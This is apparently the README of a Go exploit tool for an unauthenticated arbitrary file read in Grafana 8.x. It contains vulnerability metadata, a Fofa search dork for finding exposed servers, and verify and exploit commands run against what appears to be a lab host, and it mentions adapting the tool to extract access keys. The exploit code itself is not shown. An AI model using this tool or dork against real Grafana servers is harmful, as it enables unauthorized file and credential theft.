# GrafanaArbitraryFileRead

## Usage

### 1. show info

```bash
❯ go run main.go -s                                               
[INF] VulnInfo:
{
  "Name": "Grafana Arbitrary File Read",
  "VulID": "nil",
  "Version": "1.0",
  "Author": "z3",
  "VulDate": "2021-12-07",
  "References": [
    "https://nosec.org/home/detail/4914.html"
  ],
  "AppName": "Grafana",
  "AppPowerLink": "https://grafana.com/",
  "AppVersion": "Grafana Version 8.*",
  "VulType": "Arbitrary File Read",
  "Description": "An unauthorized arbitrary file reading vulnerability exists in Grafana, which can be exploited by an attacker to read arbitrary files on the host computer without authentication.",
  "Category": "REMOTE",
  "Dork": {
    "Fofa": "app=\"Grafana\"",
    "Quake": "",
    "Zoomeye": "",
    "Shodan": ""
  }
}%     
```

### 2. verify

```bash
echo vulfocus.fofa.so:55628 | go run main.go -v -t 20
http://vulfocus.fofa.so:55628
```

### 3. exploit

```bash
echo http://vulfocus.fofa.so:51766 | go run main.go -m exploit -v
```
Realization of the utilization idea in reference 1. To extract more information please modify the regular in the getAccesskey function.


## Reference

1. [grafana最新任意文件读取分析以及衍生问题解释](https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw)
2. [Grafana Unauthorized arbitrary file reading vulnerability](https://github.com/jas502n/Grafana-VulnTips)

## Disclaimer

This procedure is for security self-inspection only, please consciously comply with local laws.